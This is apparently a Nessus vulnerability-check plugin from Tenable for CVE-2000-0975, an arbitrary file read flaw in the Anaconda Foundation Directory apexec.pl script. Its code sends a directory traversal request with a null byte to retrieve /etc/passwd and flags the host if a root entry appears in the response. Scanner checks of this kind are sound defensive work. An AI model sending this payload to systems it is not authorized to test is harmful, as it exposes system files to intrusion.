#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10536);
 script_version ("$Revision: 1.31 $");
 script_cve_id("CVE-2000-0975");
 script_bugtraq_id(2338);
 script_osvdb_id(435);
 script_xref(name:"Secunia", value:"12861");
 
 script_name(english:"Anaconda Foundation Directory apexec.pl template Parameter Traversal Arbitrary File Retrieval");
 script_summary(english:"Anaconda Foundation Directory remote file retrieval");

 script_set_attribute(attribute:"synopsis", value:
"The remote host contains a web application that is affected by a
information disclosure vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote Anaconda Foundation Directory contains a flaw
that allows anyone to read arbitrary files with root (super-user) 
privileges, by embedding a null byte in a URL." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2000/Oct/211" );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2004/Oct/196" );
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2000/10/14");
 script_set_attribute(attribute:"vuln_publication_date", value: "2000/10/12");
 script_cvs_date("$Date: 2016/10/07 13:30:46 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();
 
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2000-2016 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);

foreach dir (cgi_dirs())
{
  item = string(dir,"/apexec.pl?etype=odp&template=../../../../../../../../../etc/passwd%00.html&passurl=/category/");
  r = http_send_recv3(method:"GET", item:item, port:port);
  if (isnull(r)) exit(0);
  rep = strcat(r[0], r[1], '\r\n', r[2]);
  if(egrep(pattern:".*root:.*:0:[01]:.*", string:rep))
  	{
  	security_warning(port);
	exit(0);
	}
}
